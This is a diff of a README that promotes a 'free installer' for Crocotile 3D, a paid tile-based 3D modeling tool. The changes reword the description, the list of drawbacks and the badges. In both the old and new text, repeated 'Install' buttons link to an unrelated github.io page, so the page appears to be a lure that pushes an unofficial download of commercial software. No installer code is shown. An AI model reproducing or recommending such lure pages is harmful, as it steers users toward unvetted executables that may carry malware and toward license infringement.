@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Voxel/Tile+3D-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-3D+Tile+Modeling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Crocotile 3D Free Installer** — Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes using 2D tile textures. Works without internet access, no account required. Full offline installation.
+**💻 Crocotile 3D Free Installer** — Crocotile 3D is a specialized 3D modeling tool for creating tile-based 3D scenes, environments, and levels. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Crocotile 3D
 
-Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes using 2D tile textures. Popular for creating PS1-era low-poly 3D art and game assets with authentic pixel texture aesthetics.
+Crocotile 3D is a specialized 3D modeling tool for creating tile-based 3D scenes, environments, and levels. Place tiles in 3D space to build game-ready environments, export to OBJ or other formats, and use the included pixel art tileset tools. Popular among indie game developers for creating retro-style 3D environments reminiscent of PlayStation-era games.
 
 ---
 
 ## ❌ Problem: Crocotile 3D is hard to access
 
-- **Niche Style** — Specifically for retro low-poly 3D art; limited general 3D utility
-- **Paid License** — Requires purchase
-- **Small Community** — Niche audience means fewer tutorials and shared assets
-- **Export Limitations** — Some game engines require additional work with exported models
+- **Niche Use Case** — Specifically designed for tile-based 3D; not for organic modeling
+- **Learning Curve** — Tile-based 3D workflow requires adjustment from traditional 3D modeling
+- **Commercial License** — Paid tool aimed at indie game developers
+- **Export Formats** — Limited export format options compared to full 3D suites
 
 ---
 
@@ -81,7 +81,7 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes
 
 ---
 
-**Crocotile 3D Free Installer** — Crocotile 3D is a 3D tile-based modeling tool for creating retro-style 3D scenes using 2D tile textures. Install without internet connection today!
+**Crocotile 3D Free Installer** — Crocotile 3D is a specialized 3D modeling tool for creating tile-based 3D scenes, environments, and levels. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile%203D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crocotile 3D](https://img.shields.io/badge/⬇_Install_Crocotile+3D-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
